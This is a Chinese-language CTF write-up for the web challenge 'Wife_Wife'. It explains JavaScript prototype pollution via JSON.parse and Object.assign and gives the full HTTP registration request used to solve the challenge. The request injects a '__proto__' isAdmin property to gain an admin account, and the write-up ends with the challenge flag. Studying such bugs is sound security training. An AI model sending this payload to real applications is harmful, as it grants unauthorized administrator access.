# Wife_Wife

> JS原型链污染

## 原型链污染

> 在一个应用中,如果攻击者控制并修改了一个对象的原型,那么将可以影响所有和这个对象来自同一个类、父祖类的对象.这种攻击方式就是原型链污染.

> 当代码中使用JSON.parse(data)解析数据时,"\_\_proto\_\_"不是键名,而是类的原型对象prototype,可以用来修改了一个对象的原型.

## Object.assign()

> Object.assign() 方法将所有可枚举(Object.propertyIsEnumerable()返回true)的自有(Object.hasOwnProperty() 返回 true)属性从一个或多个源对象复制到目标对象,返回修改后的对象.如果目标对象与源对象具有相同的key,则目标对象中的属性将被源对象中的属性覆盖,后面的源对象的属性将类似地覆盖前面的源对象的属性.

> Object.assign(target, ...sources), target: 目标对象,接收源对象属性的对象,也是修改后的返回值. sources: 源对象,包含将被合并的属性.


## 分析

> 首页是一个登陆界面,翻看hmtl源码和扫目录没啥发现,于是去注册,注册界面如果是admin账号需要邀请码,发送的数据包里直接把false改成true重发是没用的.注册普通用户后,登录,上面有虚假flag,和一张图片,以为是flag在图片中,最后发现这是错误思路,图片隐写实在misc类型题目中,不会出现在web类型题目.题解在注册时候注册成管理员账号,则直接能看到flag.

## payload

```
POST /register HTTP/1.1
Host: 61.147.171.105:64688
Content-Length: 62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://61.147.171.105:64688
Referer: http://61.147.171.105:64688/register.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"username":"admin","password":"123456","__proto__":{"isAdmin":true}}
```

## flag

> CatCTF{test_flag_h0w_c@n_I_l1ve_w1th0ut_nilou}